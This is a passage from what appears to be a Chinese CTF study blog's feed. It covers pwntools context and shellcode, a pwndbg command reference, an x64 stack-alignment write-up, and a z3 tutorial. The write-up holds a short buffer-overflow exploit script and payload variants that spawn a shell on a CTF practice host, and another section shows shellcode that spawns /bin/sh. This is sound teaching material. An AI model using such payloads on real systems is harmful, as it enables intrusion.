log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的i&#x2F;o过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和I&#x2F;O相关的错误。</p><h4 id="5-context"><a href="#5-context" class="headerlink" title="5.context"></a>5.context</h4><p>context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:</p><p>context(os&#x3D;’linux’, arch&#x3D;’amd64’, log_level&#x3D;’debug’)</p><p>或者 context(os&#x3D;’linux’, arch&#x3D;’amd64’)</p><p>这句话的意思是：</p><p>1)os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux</p><p>2)arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’</p><p>3)log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux</p><h4 id="6-汇编与shellcode"><a href="#6-汇编与shellcode" class="headerlink" title="6.汇编与shellcode"></a>6.汇编与shellcode</h4><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用&#x2F;bin&#x2F;sh</p><p>语句: shellcode &#x3D; asm(shellcraft.sh())</p><p>print(asm(shellcraft.sh())) # 打印出汇编后的shellcode</p><p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p><p>使用方法即:</p><p>context(os&#x3D;’linux’, arch&#x3D;’amd64(i386)’)</p><p>shellcode &#x3D; asm(shellcraft.sh())</p><p>p.sendline(shellcode)</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwntools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwndbg命令</title>
    <link href="/2022/09/22/pwndbg%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/22/pwndbg%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h3 id="gdb动态调式时常见的基本命令"><a href="#gdb动态调式时常见的基本命令" class="headerlink" title="gdb动态调式时常见的基本命令"></a>gdb动态调式时常见的基本命令</h3><h5 id="1、基本的调试命令"><a href="#1、基本的调试命令" class="headerlink" title="1、基本的调试命令"></a>1、基本的调试命令</h5><ul><li><code>s</code> &#x2F;&#x2F;s<strong>单步步入</strong>，遇到调用跟进函数中，相当于step into，源码层面的一步</li><li><code>si</code> &#x2F;&#x2F;<strong>常用</strong>，同s，汇编层面的一步</li><li><code>n</code> &#x2F;&#x2F;next,<strong>单步补过</strong>，遇到调用不跟进，相当于step over，源码层面的一步</li><li><code>ni</code> &#x2F;&#x2F;nexti,<strong>常用</strong>，同n，汇编层面的一步</li></ul><h5 id="下普通断点指令b-break-："><a href="#下普通断点指令b-break-：" class="headerlink" title="下普通断点指令b(break)："></a>下普通断点指令b(break)：</h5><p>b *(0x123456) &#x2F;&#x2F;常用，给0x123456地址处的指令下断点<br>b *$ rebase(0x123456) &#x2F;&#x2F;$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址<br>b function_name &#x2F;&#x2F;常用，给函数fun_name下断点，目标文件要保留符号才行<br>b file_name:fun_name<br>b file_name:15 &#x2F;&#x2F;给file_name的15行下断点，要有源码才行<br>b 15&#x2F;&#x2F;单个文件的第15行<br>b +0x10 &#x2F;&#x2F;在程序当前停住的位置下0x10的位置下断点，同样可以-0x10，就是前0x10<br>break fun if $rdi&#x3D;&#x3D;5 &#x2F;&#x2F;条件断点，rdi值为5的时候才断</p><h5 id="删除、禁用断点："><a href="#删除、禁用断点：" class="headerlink" title="删除、禁用断点："></a>删除、禁用断点：</h5><p>info b 查看断点信息</p><p>delete 5 &#x2F;&#x2F;常用，删除5号断点，直接delete不接数字删除所有<br>disable 5 &#x2F;&#x2F;常用，禁用5号断点<br>enable 5 &#x2F;&#x2F;启用5号断点<br>clear &#x2F;&#x2F;不加参数默认清除当前函数所在行的所有断点<br>clear function&#x2F;&#x2F;删除该函数内的所有断点<br>clear line&#x2F;&#x2F;删除该行的所有断点</p><h4 id="内存断点指令watch："><a href="#内存断点指令watch：" class="headerlink" title="内存断点指令watch："></a><strong>内存断点指令watch：</strong></h4><p><code>watch 0x123456</code> &#x2F;&#x2F;0x123456地址的数据改变的时候会断</p><p><code>watch a</code> &#x2F;&#x2F;变量a改变的时候会断</p><p><code>info watchpoints</code> &#x2F;&#x2F;查看watch断点信息</p><h5 id="捕获断点catch："><a href="#捕获断点catch：" class="headerlink" title="捕获断点catch："></a>捕获断点catch：</h5><p>catch syscall &#x2F;&#x2F;syscall系统调用的时候断住<br>tcatch syscall &#x2F;&#x2F;syscall系统调用的时候断住，只断一次<br>info break &#x2F;&#x2F;catch的断点可以通过i b查看<br>除syscall外还可以使用的有：</p><p>1）throw: 抛出异常</p><p>2）catch: 捕获异常</p><p>3）exec: exec被调用</p><p>4）fork: fork被调用</p><p>5）vfork: vfork被调用</p><p>6）load: 加载动态库</p><p>7）load libname: 加载名为libname的动态库</p><p>8）unload: 卸载动态库</p><p>9）unload libname: 卸载名为libname的动态库</p><p>10）syscall [args]: 调用系统调用，args可以指定系统调用号，或者系统名称</p><p>c 执行直到遇到断点</p><p>r 重新执行</p><p>fmtarg addr  在进入<code>printf</code>函数时断下，调用<code>fmtarg</code>后可以自动计算格式化参数与<code>addr</code>的偏移</p><h5 id="2-disassemble反汇编命令"><a href="#2-disassemble反汇编命令" class="headerlink" title="2.disassemble反汇编命令"></a>2.<strong>disassemble反汇编命令</strong></h5><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">disass func_name</span><br></code></pre></td></tr></table></figure><p>查看指定函数的反汇编代码，如果参数是地址则会展示该地址所在的函数反汇编代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">disass </span><span class="hljs-keyword">addr1 </span><span class="hljs-keyword">addr2</span><br></code></pre></td></tr></table></figure><p>反汇编一段内存地址, 第1个参数是起始地址，第2个是终止地址</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> disassembly-flavorintel <br></code></pre></td></tr></table></figure><p>将汇编指令格式 设置为intel格式，默认是att</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> disassembly-flavor<br></code></pre></td></tr></table></figure><p>打印当前的汇编指令格式</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">disass func_name,+<span class="hljs-built_in">number</span><br></code></pre></td></tr></table></figure><p>  指定从给定地址或函数开始反汇编的字节数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disass /m fun_name<br></code></pre></td></tr></table></figure><p> 指定此选项后，反汇编命令将显示与反汇编指令相对应的源代码行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">disass /r fun_name<br></code></pre></td></tr></table></figure><p>当指定此选项时，反汇编命令将显示所有反汇编指令的原始字节值</p><h5 id="3-vmmap"><a href="#3-vmmap" class="headerlink" title="3.vmmap"></a>3.vmmap</h5><p>显示程序运行时的地址段和权限以及位置信息</p><h5 id="4-finish"><a href="#4-finish" class="headerlink" title="4.finish"></a>4.finish</h5><p>执行到当前函数结束位置</p><h5 id="5-查看内存指令x："><a href="#5-查看内存指令x：" class="headerlink" title="5.查看内存指令x："></a>5.查看内存指令x：</h5><p>x &#x2F;nuf 0x123456 &#x2F;&#x2F;常用，x指令的格式是：x空格&#x2F;nfu，nfu代表三个参数</p><p>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’&#x2F;‘后面<br>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)<br>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。<br>x &#x2F;10gx 0x123456 &#x2F;&#x2F;常用，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p><p>x &#x2F;10xd $rdi &#x2F;&#x2F;从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p><p>x &#x2F;10i 0x123456 &#x2F;&#x2F;常用，从0x123456处向后显示十条汇编指令</p><h5 id="6-p查看变量"><a href="#6-p查看变量" class="headerlink" title="6.p查看变量"></a>6.p查看变量</h5><p>&#x2F;后的参数表</p><p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。</p><p>显示变量类型：whatis var；显示var变量的类型<br>显示变量的结构体成员： ptype var ；显示var类型结构体的成员</p><h5 id="7-args"><a href="#7-args" class="headerlink" title="7.args"></a>7.args</h5><p>显示运行的参数信息</p><h5 id="7-attach-pid"><a href="#7-attach-pid" class="headerlink" title="7.attach pid"></a>7.attach pid</h5><p>附加到pid进程上调试</p><h5 id="8-bt"><a href="#8-bt" class="headerlink" title="8.bt"></a>8.bt</h5><p>显示当前函数的调用过程</p><h5 id="9-使用shell模式下的命令："><a href="#9-使用shell模式下的命令：" class="headerlink" title="9.使用shell模式下的命令："></a>9.使用shell模式下的命令：</h5><p>直接输入shell，即可进入shell，输入exit返回gdb</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs puppet">(gdb) <span class="hljs-keyword">define</span> <span class="hljs-section">tar</span><br></code></pre></td></tr></table></figure><p>End with a line saying just “end”.</p><blockquote><p>shell tar<br>end</p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(gdb)</span>tar <br></code></pre></td></tr></table></figure><p>即可使用shell模式下tar命令，类比可得到其他命令。</p><h5 id="10-command"><a href="#10-command" class="headerlink" title="10.command"></a>10.command</h5><p>command  断点名</p><p>自动化调试，把一组gdb的命令打包执行到断点处时自动执行一系列命令，end结尾。</p><h5 id="11-打印指令p-print-："><a href="#11-打印指令p-print-：" class="headerlink" title="11.打印指令p(print)："></a>11.打印指令p(print)：</h5><p>p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号<br>p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果<br>p &amp;a &#x2F;&#x2F;查看变量a的地址<br>p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号<br>p $rdi &#x2F;&#x2F;显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值<br>p *($rdi) &#x2F;&#x2F;显示rdi指向的值</p><h5 id="其他pwndbg插件独有指令"><a href="#其他pwndbg插件独有指令" class="headerlink" title="其他pwndbg插件独有指令"></a>其他pwndbg插件独有指令</h5><p>cyclc 50 &#x2F;&#x2F;生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</p><p>cyclic -l xxxx 用来查看生成的字符串中某段的偏移</p><p>$reabse &#x2F;&#x2F;开启PIE的情况的地址偏移</p><p>b *$reabse(0x123456) &#x2F;&#x2F;断住PIE状态下的二进制文件中0x123456的地方</p><p>codebase &#x2F;&#x2F;打印PIE偏移，与rebase不同，这是打印，rebase是使用</p><p>stack &#x2F;&#x2F;查看栈</p><p>retaddr &#x2F;&#x2F;打印包含返回地址的栈地址</p><p>canary &#x2F;&#x2F;直接看canary的值</p><p>plt &#x2F;&#x2F;查看plt表</p><p>got &#x2F;&#x2F;查看got表</p><p>hexdump &#x2F;&#x2F;想IDA那样显示数据，带字符串</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn中的x64汇编的16字节对齐和堆栈平衡例子</title>
    <link href="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/"/>
    <url>/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<p>在刷buu pwn第一题的时候就碰到了这个问题，查到的writeup几乎没有真正解决这个问题的，对新手来说十分的劝退，找到的相关文章也比较难懂，针对性不强，所以做个记录。</p><p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/1.png" alt="1"></p><p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/2.png" alt="2"></p><p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/3.png" alt="3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exploit</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25348</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">15</span> + p64(<span class="hljs-number">0x401186</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>按理来说，把返回地址覆盖成了shellcode的地址，不会有问题，但是这里出错了，没成功</p><p>只要跳过push rbp</p><p>，把payload改成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401186</span>+<span class="hljs-number">1</span>)  <span class="hljs-comment">#从mov rbp, rsp开始</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401186</span>+<span class="hljs-number">4</span>)  <span class="hljs-comment">#从lea rdi,command开始</span><br></code></pre></td></tr></table></figure><p>都不会出问题</p><p>所以问题出在push rbp中</p><p>原理：x64调用约定</p><p>在x64调用约定中栈需要<strong>16字节对齐</strong>，正常情况下call调用函数前栈指针（rsp）指向的地址是0x10的整数倍，即最后一位是0，然后call命令向栈中压入的返回地址，占8个字节即8位地址（一位地址存一个byte），push rbp保存原始帧指针（rbp），又压入8字节，于是栈指针指向的地址又回到了0x10的整数倍，然后不论是开辟局部变量空间还是保存寄存器环境（因为RCX、RDX、R8、R9四个寄存器刚好是32个字节，是16字节对齐的）</p><p>tips：如果开启canary保护，用来检测的cookie不是push进去的，所以不影响rsp的对齐</p><p><img src="/2022/09/11/pwn%E4%B8%AD%E7%9A%84x64%E6%B1%87%E7%BC%96%E7%9A%8416%E5%AD%97%E8%8A%82%E5%AF%B9%E9%BD%90%E5%92%8C%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E4%BE%8B%E5%AD%90/4.png" alt="4"></p><p>所以在上面的题目中被溢出的函数的retn执行完后堆栈已经平衡并且对齐，这时省略了call的步骤直接跳到fun函数，<strong>返回地址没有被压进去</strong>，如果从push rbp开始执行的话，压入rbp后<strong>rsp就指向了最后一位是8的地址，不满足16字节对齐</strong>，而之后在不对齐的情况下call就出了问题。</p><p>这个程序本身是没法正常执行完的，system(&#x2F;bin&#x2F;sh)执行，调用shell，我们用完shell退出后，执行fun函数中的retn时已经没有返回地址了，所以执行流会返回到错误的地方，大概率不是代码段，程序就奔溃了，但在崩溃前，我们已经用shell做完了我们要做的事。</p><p>所以归根结底pwn不能硬套公式，还是要自己调试，有扎实的基本知识和分析能力才行</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>general</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x64汇编</tag>
      
      <tag>字节对齐</tag>
      
      <tag>堆栈平衡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_z3</title>
    <link href="/2022/09/11/python-z3/"/>
    <url>/2022/09/11/python-z3/</url>
    
    <content type="html"><![CDATA[<h1 id="python-z3"><a href="#python-z3" class="headerlink" title="python z3"></a>python z3</h1><p>Z3是由Microsoft Research开发的高性能定理证明器。(可以理解为自动解方程组的感觉)。Z3 在工业应用中实际上常见于软件验证、程序分析等。</p><p>由于Z3功能实在强大，也被用于很多其他领域：软件&#x2F;硬件验证和测试，约束解决，混合系统分析，安全性，生物学（计算机模拟分析）和几何问题。</p><p>CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。</p><p>api文档：<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p><a href="https://z3prover.github.io/api/html/namespacez3py.html">https://z3prover.github.io/api/html/namespacez3py.html</a></p><p>相关教程：<a href="https://www.cnblogs.com/hetianlab/p/13685260.html">https://www.cnblogs.com/hetianlab/p/13685260.html</a></p><p><a href="https://www.codeleading.com/article/50864767427/">https://www.codeleading.com/article/50864767427/</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install z3<br><br>pip install z3_solver<br><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span>* <span class="hljs-comment">#引入库</span><br></code></pre></td></tr></table></figure><h3 id="声明变量（未知数）"><a href="#声明变量（未知数）" class="headerlink" title="声明变量（未知数）"></a>声明变量（未知数）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)    <span class="hljs-comment">#声明整数</span><br>x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)   <span class="hljs-comment">#声明实数 </span><br>x = Bool(<span class="hljs-string">&#x27;x&#x27;</span>)   <span class="hljs-comment">#声明布尔类型</span><br>x = Bitvec(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-number">8</span>)  <span class="hljs-comment">#声明一个8位的位向量 位向量，用于求解与/或/移位等位运算</span><br>x,y=Ints(<span class="hljs-string">&#x27;x y&#x27;</span>)   <span class="hljs-comment">#批量声明整数未知数,Real和Bool相同</span><br>x,y=Bitsvecs(<span class="hljs-string">&#x27;x y&#x27;</span>,<span class="hljs-number">8</span>)   <span class="hljs-comment">#批量声明位向量</span><br><br>A=Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>B=ToReal(A)<span class="hljs-comment">#整型转换成实数</span><br></code></pre></td></tr></table></figure><h3 id="增加方程约束和求解"><a href="#增加方程约束和求解" class="headerlink" title="增加方程约束和求解"></a>增加方程约束和求解</h3><p>**断言(assertion)**是一种在程序中的一阶逻辑(如：一个结果为真或假的逻辑判断式)，目的为了表示与验证软件开发者预期的结果——当程序执行到断言的位置时，对应的断言应该为真。若断言不为真时，程序会中止执行，并给出错误信息。</p><p>这里最好知道断言的概念，z3的求解器以assert为参数,判断有无解，有解则求出当参数中的assert都满足时的解</p><h5 id="solve-和求解器Solver"><a href="#solve-和求解器Solver" class="headerlink" title="solve()和求解器Solver()"></a>solve()和求解器Solver()</h5><p><strong>solve()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>A, B =Ints(<span class="hljs-string">&quot;a b&quot;</span>)<br>assert1 = <span class="hljs-number">2</span> * A + B == <span class="hljs-number">7</span><br>assert2 = A + B == <span class="hljs-number">5</span><br>solve(assert1, assert2)  <span class="hljs-comment">## 直接打印符合约束条件的未知量的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">以下是输出</span><br><span class="hljs-string">[b = 3, a = 2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Solver()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>A, B = Ints(<span class="hljs-string">&quot;a b&quot;</span>)<br>s = Solver()     <span class="hljs-comment">#以s为载体创建求解器</span><br>assert1 = <span class="hljs-number">2</span> * A + B == <span class="hljs-number">7</span><br>assert2 = A + B == <span class="hljs-number">5</span><br>s.add(assert1, assert2)<span class="hljs-comment">#加入限制条件</span><br><span class="hljs-built_in">print</span>(s.check()) <span class="hljs-comment"># 返回sat代表有解，unsat代表无解</span><br><span class="hljs-built_in">print</span>(s.model()) <span class="hljs-comment"># 返回符合约束条件的未知量的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">以下是输出</span><br><span class="hljs-string">sat  </span><br><span class="hljs-string">[b = 3, a = 2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h5 id><a href="#" class="headerlink" title></a></h5><h5 id="遍历Solver-中的断言"><a href="#遍历Solver-中的断言" class="headerlink" title="遍历Solver()中的断言"></a>遍历Solver()中的断言</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">A = Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>B = Int(<span class="hljs-string">&#x27;b&#x27;</span>)<br>s = Solver()<br>s.add(a == <span class="hljs-number">1</span>,b == <span class="hljs-number">2</span>,a+b == <span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> C <span class="hljs-keyword">in</span> s.assertions():<br>    <span class="hljs-built_in">print</span>(C)<br></code></pre></td></tr></table></figure><h3 id="sort-返回表达式的结果类型"><a href="#sort-返回表达式的结果类型" class="headerlink" title=".sort() 返回表达式的结果类型"></a>.sort() 返回表达式的结果类型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Int(<span class="hljs-string">&#x27;x&#x27;</span>)<br>y = Real(<span class="hljs-string">&#x27;y&#x27;</span>)<br>t1 = (x + <span class="hljs-number">1</span>).sort()<br>t2 = (y + <span class="hljs-number">1</span>).sort()<br>t3 = (x &gt;= <span class="hljs-number">2</span>).sort()<br><span class="hljs-built_in">print</span>(t1,t2,t3)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">输出:</span><br><span class="hljs-string">Int Real Bool</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Real实数的精度设置"><a href="#Real实数的精度设置" class="headerlink" title="Real实数的精度设置"></a>Real实数的精度设置</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">x = Real(<span class="hljs-string">&#x27;x&#x27;</span>)<br>solve(<span class="hljs-number">3</span>*x==<span class="hljs-number">1</span>)<br><br>set_option(rational_to_decimal=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 启用精度</span><br>solve(<span class="hljs-number">3</span>*x==<span class="hljs-number">1</span>)<br><br>set_option(precision=<span class="hljs-number">30</span>)   <span class="hljs-comment"># 设置精度</span><br>solve(<span class="hljs-number">3</span>*x==<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">输出：</span><br><span class="hljs-string">[x = 1/3]</span><br><span class="hljs-string">[x = 0.3333333333?]</span><br><span class="hljs-string">[x = 0.333333333333333333333333333333?]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="检查模型"><a href="#检查模型" class="headerlink" title="检查模型"></a>检查模型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">x, y, z = Reals(<span class="hljs-string">&#x27;x y z&#x27;</span>)<br>s = Solver()<br>s.add(x &gt; <span class="hljs-number">1</span>, y &gt; <span class="hljs-number">1</span>, x + y &gt; <span class="hljs-number">3</span>, z - x &lt; <span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(s.check()) <br><br>m = s.model()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = %s&quot;</span> % m[x]) <br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;traversing model...&quot;</span>) <br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m.decls():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s = %s&quot;</span> % (d.name(), m[d])) <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>basic</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>符号执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>system系统函数</title>
    <link href="/2022/09/09/system%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/"/>
    <url>/2022/09/09/system%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0/</url>
    
